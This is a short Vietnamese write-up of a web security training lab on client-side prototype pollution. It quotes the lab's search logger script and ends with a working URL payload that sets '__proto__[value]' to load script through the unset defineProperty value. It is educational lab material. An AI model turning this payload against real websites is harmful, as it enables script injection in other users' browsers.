# Lab: Client-side prototype pollution via browser APIs

Dùng DOM Invader thì thấy gadget là `value`.

Source code có dùng file `/resources/js/searchLoggerConfigurable.js`, nội dung chính như sau:

```javascript
async function logQuery(url, params) {
  try {
    await fetch(url, {
      method: "post",
      keepalive: true,
      body: JSON.stringify(params),
    });
  } catch (e) {
    console.error("Failed storing query");
  }
}

async function searchLogger() {
  let config = {
    params: deparam(new URL(location).searchParams.toString()),
    transport_url: false,
  };
  Object.defineProperty(config, "transport_url", {
    configurable: false,
    writable: false,
  });
  if (config.transport_url) {
    let script = document.createElement("script");
    script.src = config.transport_url;
    document.body.appendChild(script);
  }
  if (config.params && config.params.search) {
    await logQuery("/logger", config.params);
  }
}

window.addEventListener("load", searchLogger);
```

`transport_url` đã được define trên object `config`, nên nhìn qua thì có vẻ không khai thác được.

Lưu ý là dòng kế tiếp dùng `Object.defineProperty()` để khóa `transport_url`, nhưng lại không set `value`. Đây là điểm có thể tận dụng.

Dùng payload sau để exploit:

```
/?__proto__[value]=data:,alert(1)
```
